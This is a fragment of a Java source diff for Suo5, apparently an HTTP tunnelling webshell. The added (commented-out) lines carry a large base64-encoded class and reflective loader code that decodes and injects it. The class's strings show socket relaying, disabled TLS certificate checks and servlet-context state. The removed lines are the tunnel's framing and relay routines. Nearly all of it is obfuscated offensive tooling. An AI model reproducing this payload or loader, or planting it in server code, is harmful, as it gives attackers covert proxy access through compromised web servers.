-//                processDataBio(request, response,in);
-//            } else {
-//                processDataUnary(request, response,in);
+//
+//        ClassLoader loader = Suo5.class.getClassLoader();
+//        String clazzBase64 = "yv66vgAAADECGgoABgD4CQBqAPkJAGoA+gcA+wgA/AcA/QgA/goAagD/BwEACAEBCAECCgAJAQMKAGoBBAgBBQoAagEGCgBqAQcHAQgHAQkKABIBCgcBCwoAFAD4CgAUAQwKAB0BDQoAHQEOBQAAAAAAAADICgBsAQ8IARAHAREKAGoBEggBEwcBFAoAIAEVCgAgARYHARcKACMA+AgBGAoAIwEZCAEaCAEbBwEcBwEdCgAqAPgKACoBHggBHwoAKgEgCgAqASEKACkBIgoBIwEkBwElCgAyAPgKACMBJgsBJwEoCgAjASkHASoKAAkBKwoAMgEsCgAJAS0KADIBFQoAagEuCgAyAS8KATABMQoBMAEyCgEwATMKATABNAoBMAE1BwE2CgBDATcKAEMBOAoBMAE5CgEwAToKATABOwMCAAAABwE8CAE9CgBKASIIAT4KABIBIgoAagE/CgAJAUAIAUEKAGoBQggBQwcBRAoAVAE3CgBqAUUIAUYKAJwBRwgBSAgBSQgBSggBSwgBTAgBTQoAnAFOBwFPCgBgAPgHAVAKAGIBUQoAYAFSCgBqAVMKAGoBVAoAIAFVCgBgAVYKAGABVwcBWAoAagFZBwFaCgBsAVsKAGwBXAoAagFdCgBgAVUKAGwBXgoAHQFfCgBqAWAIAWEIAWIIAWMKACMBZAoAagFlCgBqAWYKAJcBZwgBaAoABgFpCAFqBwFrCgB+AWwKAW0BbgoAagFvCgCXAVcIAXAIAXEKAGoBcgoAiQFzCwCrAXQLAKsBdQcBdgoAiQF3BwF4CgCLAXkKAAkBegoACQF7CQF8AX0HAX4KAJABIgoAkAF/CQBqAYAKACMBgQgBggoAkAGDBwGECgCXAYUIAYYJAJwBhwoAfgGIBwGJCgCcAYoIAYsKAJcBjAoAlwGNBwGOCgB+AY8KAKEBkAgBkQoBkgGTBwGUCgGSAZUKAZIBlgoAoQGXCAGYBwGZCgCXAZoKAJcBVgoAlwGbBwGcCgB+AZ0HAZ4JALEBhwcBnwkAswGHCgBqAaAKAW0BoQoBbQGiCgBqAaMHAaQHAaUHAaYBAAVhZGRycwEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAAlnSW5TdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAApnT3V0U3RyZWFtAQAWTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEABjxpbml0PgEALihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9pby9PdXRwdXRTdHJlYW07KVYBAARDb2RlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAacmVhZElucHV0U3RyZWFtV2l0aFRpbWVvdXQBABsoTGphdmEvaW8vSW5wdXRTdHJlYW07W0JJKVYBAApFeGNlcHRpb25zBwGnAQANdHJ5RnVsbER1cGxleAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgEACW5ld0NyZWF0ZQEAFihCKUxqYXZhL3V0aWwvSGFzaE1hcDsBAAduZXdEYXRhAQAXKFtCKUxqYXZhL3V0aWwvSGFzaE1hcDsBAAZuZXdEZWwBABUoKUxqYXZhL3V0aWwvSGFzaE1hcDsBAAluZXdTdGF0dXMBAAp1MzJ0b0J5dGVzAQAFKEkpW0IBAApieXRlc1RvVTMyAQAFKFtCKUkBAAtjb3B5T2ZSYW5nZQEACChbQklJKVtCAQAHbWFyc2hhbAEAFyhMamF2YS91dGlsL0hhc2hNYXA7KVtCAQAJdW5tYXJzaGFsAQAqKExqYXZhL2lvL0lucHV0U3RyZWFtOylMamF2YS91dGlsL0hhc2hNYXA7AQAOcHJvY2Vzc0RhdGFCaW8BAApyZWFkU29ja2V0AQAvKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2lvL091dHB1dFN0cmVhbTtaKVYBAAdyZWFkUmVxAQA2KExqYXZhL2lvL0J1ZmZlcmVkSW5wdXRTdHJlYW07TGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQAQcHJvY2Vzc0RhdGFVbmFyeQEAA3J1bgEAAygpVgEAC2NvbGxlY3RBZGRyAQALaXNMb2NhbEFkZHIBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAhyZWRpcmVjdAEAVShMamF2YS9sYW5nL09iamVjdDtMamF2YS91dGlsL0hhc2hNYXA7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbjsBAAZ2ZXJpZnkBAC8oTGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L25ldC9zc2wvU1NMU2Vzc2lvbjspWgEAEmNoZWNrQ2xpZW50VHJ1c3RlZAEAOihbTGphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGU7TGphdmEvbGFuZy9TdHJpbmc7KVYHAagBABJjaGVja1NlcnZlclRydXN0ZWQBABJnZXRBY2NlcHRlZElzc3VlcnMBACcoKVtMamF2YS9zZWN1cml0eS9jZXJ0L1g1MDlDZXJ0aWZpY2F0ZTsBAAxpbnZva2VNZXRob2QBAEsoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA1pbnZva2VNZXRob2QyAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIPGNsaW5pdD4MAMIA5QwAvgC/DADAAMEBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL09iamVjdAEAClVzZXItQWdlbnQMAPMA9AEAEGphdmEvbGFuZy9TdHJpbmcBAAxDb250ZW50LVR5cGUBABFhcHBsaWNhdGlvbi9wbGFpbgwAxQDGDADLAMwBABhhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0MAN4AzAwA4wDMAQATamF2YS9sYW5nL1Rocm93YWJsZQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAakA5QEADmphdmEvdXRpbC9EYXRlDAGqAasMAawBrQwBrgGvDAGwAbEBAA5nZXRJbnB1dFN0cmVhbQEAE2phdmEvaW8vSW5wdXRTdHJlYW0MAMcAyAEAD2dldE91dHB1dFN0cmVhbQEAFGphdmEvaW8vT3V0cHV0U3RyZWFtDAGyAbMMAbQA5QEAEWphdmEvdXRpbC9IYXNoTWFwAQACYWMMAbUBtgEAAXMBAAJkdAEAImphdmEvbGFuZy9JbGxlZ2FsQXJndW1lbnRFeGNlcHRpb24BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBtwG4AQADID4gDAG3AbkMAboBuwwAwgG8BwG9DAG+Ab8BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBwAHBBwHCDAHDAcQMAcUBxgEAAltCDAHHAa0MAbIByAwByQHKDADUANUMAcsBygcBzAwBzQHODAHPAc4MAbUB0AwBtQHRDAHSAcoBABdqYXZhL2lvL0RhdGFJbnB1dFN0cmVhbQwAwgHTDAHUAbMMAdUB0QwB1gGtDAHFAdcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALaW52YWxpZCBsZW4BAA1rZXkgbGVuIGVycm9yDADYANkMAMIBswEAD3ZhbHVlIGxlbiBlcnJvcgwA1gDXAQALdmFsdWUgZXJyb3IBABtqYXZhL2lvL0J1ZmZlcmVkSW5wdXRTdHJlYW0MANwA3QEACXNldFN0YXR1cwwB2AHZAQANc2V0QnVmZmVyU2l6ZQEACXNldEhlYWRlcgEAEVgtQWNjZWwtQnVmZmVyaW5nAQACbm8BAAFoAQABcAwB2gHbAQAPamF2YS9uZXQvU29ja2V0AQAaamF2YS9uZXQvSW5ldFNvY2tldEFkZHJlc3MMAMIB3AwB3QHeDADTAM4MANoA2wwB3wDlDAETAeAMARAB4QEACnZzdW9zeXN0ZW0MAMIAwwEAEGphdmEvbGFuZy9UaHJlYWQMAMIB4gwB4wDlDADhAOIMAeQA5QwBrgDXDADPANABAAJpZAEAAXIBAAAMAeUBxgwA5wDoDADpAOoMAeYA5QEAEWdldFNlcnZsZXRDb250ZXh0DAHnAegBAAxnZXRBdHRyaWJ1dGUBAA9qYXZhL2xhbmcvQ2xhc3MMAekB6gcB6wwB7AHtDADRANIBAAxzZXRBdHRyaWJ1dGUBAA9yZW1vdmVBdHRyaWJ1dGUMAN8A4AwB7gHvDAHwAfEMAfIB8wEAGWphdmEvbmV0L05ldHdvcmtJbnRlcmZhY2UMAfQB7wEAFGphdmEvbmV0L0luZXRBZGRyZXNzDAH1AbsMAfYB9wwB+AH5BwH6DAH7AfwBAAxqYXZhL25ldC9VUkwMAf0BuwwAvAC9DAH+AMYBAAlnZXRNZXRob2QMAf8CAAEAGmphdmEvbmV0L0h0dHBVUkxDb25uZWN0aW9uDAIBAbwBABFzZXRDb25uZWN0VGltZW91dAwCAgIDDAGCAeoBABFqYXZhL2xhbmcvSW50ZWdlcgwAwgHIAQAOc2V0UmVhZFRpbWVvdXQMAgQCBQwCBgIFAQAgamF2YXgvbmV0L3NzbC9IdHRwc1VSTENvbm5lY3Rpb24MAgcAxgwCCAIJAQADU1NMBwIKDAILAgwBABpqYXZheC9uZXQvc3NsL1RydXN0TWFuYWdlcgwCDQIODAIPAhAMAhECEgEADmdldEhlYWRlck5hbWVzAQAVamF2YS91dGlsL0VudW1lcmF0aW9uDAITAhQMAhUBrQEAImphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGUMAhYCFwEADmphdmEvbGFuZy9Mb25nAQAPamF2YS9sYW5nL1Nob3J0DAD1APYMAhgB8QwCGQIFDADmANIBABJqYXZhL2xhbmcvUnVubmFibGUBAB5qYXZheC9uZXQvc3NsL0hvc3RuYW1lVmVyaWZpZXIBAB5qYXZheC9uZXQvc3NsL1g1MDlUcnVzdE1hbmFnZXIBAB5qYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb24BACdqYXZhL3NlY3VyaXR5L2NlcnQvQ2VydGlmaWNhdGVFeGNlcHRpb24BAA9wcmludFN0YWNrVHJhY2UBAAdnZXRUaW1lAQADKClKAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEAByhbQklJKUkBAAVzbGVlcAEABChKKVYBAAV3cml0ZQEABShbQilWAQAFZmx1c2gBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmFwcGVuZAEAHChJKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAOamF2YS9sYW5nL01hdGgBAANtaW4BAAUoSUkpSQEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7AQANamF2YS91dGlsL1NldAEAB3RvQXJyYXkBABUoKVtMamF2YS9sYW5nL09iamVjdDsBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmxlbmd0aAEABChJKVYBAAhnZXRCeXRlcwEABCgpW0IBAAt0b0J5dGVBcnJheQEAE2phdmEvbmlvL0J5dGVCdWZmZXIBAAhhbGxvY2F0ZQEAGChJKUxqYXZhL25pby9CeXRlQnVmZmVyOwEABnB1dEludAEAGChCKUxqYXZhL25pby9CeXRlQnVmZmVyOwEAGShbQilMamF2YS9uaW8vQnl0ZUJ1ZmZlcjsBAAVhcnJheQEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEACXJlYWRGdWxseQEABHdyYXABAAZnZXRJbnQBAAMoKUIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAB2Nvbm5lY3QBABwoTGphdmEvbmV0L1NvY2tldEFkZHJlc3M7SSlWAQAFY2xvc2UBABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsBABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAFyhMamF2YS9sYW5nL1J1bm5hYmxlOylWAQAFc3RhcnQBAARqb2luAQAGcmVtb3ZlAQAKZGlzY29ubmVjdAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFGdldE5ldHdvcmtJbnRlcmZhY2VzAQAZKClMamF2YS91dGlsL0VudW1lcmF0aW9uOwEAD2hhc01vcmVFbGVtZW50cwEAAygpWgEAC25leHRFbGVtZW50AQAUKClMamF2YS9sYW5nL09iamVjdDsBABBnZXRJbmV0QWRkcmVzc2VzAQAOZ2V0SG9zdEFkZHJlc3MBAAdpbmRleE9mAQAEKEkpSQEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvQm9vbGVhbgEABFRSVUUBABNMamF2YS9sYW5nL0Jvb2xlYW47AQAHZ2V0SG9zdAEAC2NvbnRhaW5zS2V5AQAOb3BlbkNvbm5lY3Rpb24BABooKUxqYXZhL25ldC9VUkxDb25uZWN0aW9uOwEAEHNldFJlcXVlc3RNZXRob2QBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsBAAtzZXREb091dHB1dAEABChaKVYBAApzZXREb0lucHV0AQAKaXNJbnN0YW5jZQEAE3NldEhvc3RuYW1lVmVyaWZpZXIBACMoTGphdmF4L25ldC9zc2wvSG9zdG5hbWVWZXJpZmllcjspVgEAGGphdmF4L25ldC9zc2wvU1NMQ29udGV4dAEAC2dldEluc3RhbmNlAQAuKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvbmV0L3NzbC9TU0xDb250ZXh0OwEABGluaXQBAFcoW0xqYXZheC9uZXQvc3NsL0tleU1hbmFnZXI7W0xqYXZheC9uZXQvc3NsL1RydXN0TWFuYWdlcjtMamF2YS9zZWN1cml0eS9TZWN1cmVSYW5kb207KVYBABBnZXRTb2NrZXRGYWN0b3J5AQAiKClMamF2YXgvbmV0L3NzbC9TU0xTb2NrZXRGYWN0b3J5OwEAE3NldFNTTFNvY2tldEZhY3RvcnkBACMoTGphdmF4L25ldC9zc2wvU1NMU29ja2V0RmFjdG9yeTspVgEAEnNldFJlcXVlc3RQcm9wZXJ0eQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEAD2dldFJlc3BvbnNlQ29kZQEAEGlzQXNzaWduYWJsZUZyb20BABQoTGphdmEvbGFuZy9DbGFzczspWgEADGlzQWNjZXNzaWJsZQEADXNldEFjY2Vzc2libGUAIQBqAAYAAwC5ALoAuwADAAgAvAC9AAAAAAC+AL8AAAAAAMAAwQAAABwAAQDCAMMAAQDEAAAAGwACAAMAAAAPKrcAASortQACKiy1AAOxAAAAAAABAMUAxgABAMQAAACzAAYACAAAAH8rwAAEwAAETSwDMk4sBDI6BC0SBQS9AAZZAxIHU7gACMAA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";
+//        byte[] clazzByte;
+//        try {
+//            try {
+//                Class Base64 = loader.loadClass("sun.misc.BASE64Decoder");
+//                Object Decoder = Base64.newInstance();
+//                clazzByte=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{(clazzBase64)});
+//            } catch (Throwable ex)
+//            {
+//                Class Base64 = loader.loadClass("java.util.Base64");
+//                Object Decoder = Base64.getDeclaredMethod("getDecoder",new Class[0]).invoke(null, new Object[0]);
+//                clazzByte=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{clazzBase64});
 //            }
-        } catch (Throwable e) {
-//                System.out.printf("process data error %s\n", e);
-//                e.printStackTrace();
-        }
-    }
-
-    public static void readInputStreamWithTimeout(InputStream is, byte[] b, int timeoutMillis) throws IOException, InterruptedException {
-        int bufferOffset = 0;
-        long maxTimeMillis = new Date().getTime() + timeoutMillis;
-        while (new Date().getTime() < maxTimeMillis && bufferOffset < b.length) {
-            int readLength = b.length - bufferOffset;
-            if (is.available() < readLength) {
-                readLength = is.available();
-            }
-            // can alternatively use bufferedReader, guarded by isReady():
-            int readResult = is.read(b, bufferOffset, readLength);
-            if (readResult == -1) break;
-            bufferOffset += readResult;
-            Thread.sleep(200);
-        }
-    }
-
-    public static void tryFullDuplex(Object request, Object response,java.io.InputStream in) throws IOException, InterruptedException {
-        byte[] data = new byte[32];
-        readInputStreamWithTimeout(in, data, 2000);
-        try {
-            OutputStream out = (OutputStream) MyResponse.getOutputStream(response);
-            out.write(data);
-            out.flush();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-
-    private HashMap newCreate(byte s) {
-        HashMap m = new HashMap();
-        m.put("ac", new byte[]{0x04});
-        m.put("s", new byte[]{s});
-        return m;
-    }
-
-    private static HashMap newData(byte[] data) {
-        HashMap m = new HashMap();
-        m.put("ac", new byte[]{0x01});
-        m.put("dt", data);
-        return m;
-    }
-
-    private static HashMap newDel() {
-        HashMap m = new HashMap();
-        m.put("ac", new byte[]{0x02});
-        return m;
-    }
-
-    private static HashMap newStatus(byte b) {
-        HashMap m = new HashMap();
-        m.put("s", new byte[]{b});
-        return m;
-    }
-
-    static byte[] u32toBytes(int i) {
-        byte[] result = new byte[4];
-        result[0] = (byte) (i >> 24);
-        result[1] = (byte) (i >> 16);
-        result[2] = (byte) (i >> 8);
-        result[3] = (byte) (i /*>> 0*/);
-        return result;
-    }
-
-    static int bytesToU32(byte[] bytes) {
-        return ((bytes[0] & 0xFF) << 24) |
-                ((bytes[1] & 0xFF) << 16) |
-                ((bytes[2] & 0xFF) << 8) |
-                ((bytes[3] & 0xFF) << 0);
-    }
-
-    static byte[] copyOfRange(byte[] original, int from, int to) {
-        int newLength = to - from;
-        if (newLength < 0) {
-            throw new IllegalArgumentException(from + " > " + to);
-        }
-        byte[] copy = new byte[newLength];
-        int copyLength = Math.min(original.length - from, newLength);
-        // can't use System.arraycopy of Arrays.copyOf, there is no system in some environment
-        // System.arraycopy(original, from, copy, 0,  copyLength);
-        for (int i = 0; i < copyLength; i++) {
-            copy[i] = original[from + i];
-        }
-        return copy;
-    }
-
-
-    private static byte[] marshal(HashMap m) throws IOException {
-        ByteArrayOutputStream buf = new ByteArrayOutputStream();
-        Object[] keys = m.keySet().toArray();
-        for (int i = 0; i < keys.length; i++) {
-            String key = (String) keys[i];
-            byte[] value = (byte[]) m.get(key);
-            buf.write((byte) key.length());
-            buf.write(key.getBytes());
-            buf.write(u32toBytes(value.length));
-            buf.write(value);
-        }
-
-        byte[] data = buf.toByteArray();
-        ByteBuffer dbuf = ByteBuffer.allocate(5 + data.length);
-        dbuf.putInt(data.length);
